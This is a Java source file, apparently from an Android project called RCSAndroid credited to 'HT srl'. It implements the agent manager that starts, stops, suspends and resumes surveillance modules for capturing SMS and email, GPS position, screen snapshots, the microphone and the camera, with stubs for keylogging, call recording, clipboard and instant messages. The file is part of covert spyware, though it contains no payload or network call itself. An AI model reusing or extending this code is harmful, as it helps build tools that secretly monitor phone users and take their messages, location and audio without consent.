/***********************************************
 * Create by : Alberto "Quequero" Pelliccione
 * Company   : HT srl
 * Project   : RCSAndroid
 * Created   : 30-mar-2011
 **********************************************/

package com.ht.RCSAndroidGUI.agent;

import java.util.HashMap;
import java.util.Iterator;

import android.util.Log;

import com.ht.RCSAndroidGUI.Manager;
import com.ht.RCSAndroidGUI.Status;
import com.ht.RCSAndroidGUI.conf.Configuration;
import com.ht.RCSAndroidGUI.util.Check;

// TODO: Auto-generated Javadoc
/**
 * The Class AgentManager.
 */
public class AgentManager extends Manager<AgentBase, AgentType> {

	/** The Constant TAG. */
	private static final String TAG = "AgentManager";

	/** The singleton. */
	private volatile static AgentManager singleton;

	/**
	 * Self.
	 * 
	 * @return the agent manager
	 */
	public static AgentManager self() {
		if (singleton == null) {
			synchronized (AgentManager.class) {
				if (singleton == null) {
					singleton = new AgentManager();
				}
			}
		}

		return singleton;
	}

	/**
	 * mapAgent() Add agent id defined by "key" into the running map. If the
	 * agent is already present, the old object is returned.
	 * 
	 * @param key
	 *            : Agent ID
	 * @return the requested agent or null in case of error
	 */
	private AgentBase factory(AgentType type) {
		AgentBase a = null;

		if (running.containsKey(type) == true) {
			return running.get(type);
		}

		switch (type) {
		case AGENT_SMS:
			a = new MessageAgent();
			break;

		case AGENT_TASK:
			break;

		case AGENT_CALLLIST:
			break;

		case AGENT_DEVICE:
			a = new DeviceAgent();
			break;

		case AGENT_POSITION:
			a = new PositionAgent();
			break;

		case AGENT_CALL:
			break;

		case AGENT_CALL_LOCAL:
			break;

		case AGENT_KEYLOG:
			break;

		case AGENT_SNAPSHOT:
			a = new SnapshotAgent();
			break;

		case AGENT_URL:
			break;

		case AGENT_IM:
			break;

		case AGENT_EMAIL:
			a = new MessageAgent();
			break;

		case AGENT_MIC:
			a = new MicAgent();
			break;

		case AGENT_CAM:
			a = new CameraAgent();
			break;

		case AGENT_CLIPBOARD:
			break;

		case AGENT_CRISIS:
			a = new CrisisAgent();
			break;

		case AGENT_APPLICATION:
			break;
			
		case AGENT_LIVEMIC:
			break;

		default:
			Log.d("QZ", TAG + " Error (factory): unknown type");
			break;
		}

		if (a != null) {
			running.put(type, a);
		}

		return a;
	}

	/**
	 * Start agents.
	 * 
	 * @return true, if successful
	 */
	public boolean startAll() {
		HashMap<AgentType, AgentConf> agents;
		agents = status.getAgentsMap();

		if (agents == null) {
			Log.d("QZ", TAG + " Agents map null");
			return false;
		}

		if (running == null) {
			Log.d("QZ", TAG + " Running Agents map null");
			return false;
		}

		final Iterator<AgentType> it = agents.keySet().iterator();

		while (it.hasNext()) {
			final AgentType key = it.next();
			Check.asserts(key != null, "null type");
			AgentConf conf = agents.get(key);
			if(conf.isEnabled()){
				start(key);
			}
		}

		return true;
	}

	// Deve essere bloccante. Attende l'effettivo stop di tutto.
	/**
	 * Stop agents.
	 */
	public void stopAll() {
		HashMap<AgentType, AgentConf> agents;
		agents = status.getAgentsMap();
		final Iterator<AgentType> it = agents.keySet().iterator();

		while (it.hasNext()) {
			final AgentType key = it.next();
			stop(key);
		}
		
		Check.ensures(threads.size() == 0, "Non empty threads");
		Check.ensures(running.size() == 0, "Non empty running");
		
		running.clear();
		threads.clear();
	}

	/**
	 * Start agent.
	 * 
	 * @param key
	 *            the key
	 */
	public synchronized void start(final AgentType key) {
		HashMap<AgentType, AgentConf> agents;

		agents = status.getAgentsMap();

		if (agents == null) {
			Log.d("QZ", TAG + " Agents map null");
			return;
		}

		if (running == null) {
			Log.d("QZ", TAG + " Running Agents map null");
			return;
		}

		AgentBase a = factory(key);

		if (a == null) {
			return;
		}

		// Agent mapped and running
		if (a.getStatus() == AgentConf.AGENT_RUNNING) {
			Log.d("QZ", TAG + " Agent " + key + " is already running");
			return;
		}

		// start() will NEVER be valid again on a stopped thread
		// so unmap and restart the thread
		if (a.getStatus() == AgentConf.AGENT_STOPPED) {
			// running.remove(key);
			a = factory(key);
		}

		Check.asserts(a != null, "null agent");
		Check.asserts(running.get(key) != null, "null running");

		a.parse(agents.get(key).getParams());

		final Thread t = new Thread(a);
		if(Configuration.DEBUG){
			t.setName(a.getClass().getSimpleName());
		}
		threads.put(a, t);
		t.start();

	}

	/**
	 * Stop agent.
	 * 
	 * @param key
	 *            the key
	 */
	public synchronized void stop(final AgentType key) {
		final AgentBase a = running.get(key);
		if (a == null) {
			Log.d("QZ", TAG + " Agent " + key + " not present");
			return;
		}

		a.stopThread();
		running.remove(key);

		final Thread t = threads.get(a);
		if (t != null) {
			try {
				t.join();
			} catch (final InterruptedException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
		threads.remove(a);
	}

	/**
	 * Suspend an agent, used by crisis
	 * 
	 * @param key
	 *            the key
	 */
	public void suspend(int key) {
		final AgentBase a = running.get(key);
		if (a == null) {
			Log.d("QZ", TAG + " Agent " + key + " not present");
			return;
		}

		// suspending a thread implies a stop
		a.suspend();

		final Thread t = threads.get(a);
		if (t != null) {
			try {
				t.join();
			} catch (final InterruptedException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
		threads.remove(a);

	}

	/**
	 * Resume an agent, only if suspended
	 * 
	 * @param key
	 *            the key
	 */
	public void resume(int key) {
		final AgentBase a = running.get(key);
		if (a == null) {
			Log.d("QZ", TAG + " Agent " + key + " not present");
			return;
		}

		if (a.isSuspended()) {
			// this clean the suspendend status
			a.resume();

			// start a new thread and restart the loop.
			final Thread t = new Thread(a);
			threads.put(a, t);
			t.start();

		}
	}

}
